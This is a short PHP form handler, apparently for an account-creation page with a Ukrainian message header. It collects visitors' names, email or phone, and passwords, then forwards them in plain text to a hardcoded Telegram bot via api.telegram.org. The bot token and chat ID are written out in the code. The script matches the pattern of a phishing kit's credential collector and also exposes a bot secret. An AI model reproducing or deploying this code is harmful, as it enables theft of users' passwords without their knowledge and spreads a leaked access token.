<?php
if($_POST) {
    try{
        $firsname = $_POST["firstname"];
        $lastname = $_POST["lastname"];
        $emorph = $_POST["emorph"];
        $password = $_POST["password"];
        $reppasword = $_POST["reppasword"];
    }catch(\Throwable $th) {
        $firsname = "Error in massege";
        $lastname = "Error in massege";
        $emorph = "Error in massege";
        $password = "Error in massege";
        $reppasword = "Error in massege";
    }
        $token = "8842868099:AAHmCFsEVBLwH-Js-Gf7TrcFLs3P4rdpdsQ";
        $chat_id = 5368288287;
        $textMessage = "Стварення акаунту у нашому сайті. \n firstname:" . $firsname . " \n lastname: " . $lastname . " \n email or phone:" . $emorph . " \n pasword:" . $password . " \n reppasword:" . $reppasword;
        $textMessage = urlencode ("$textMessage");
        $urlQuery = "https://api.telegram.org/bot". $token ."/sendMessage?chat_id=". $chat_id. "&text=" . $textMessage;
        $urlQuery .= "&parse_mode=HTML";
        $result = file_get_contents ($urlQuery);
}
?>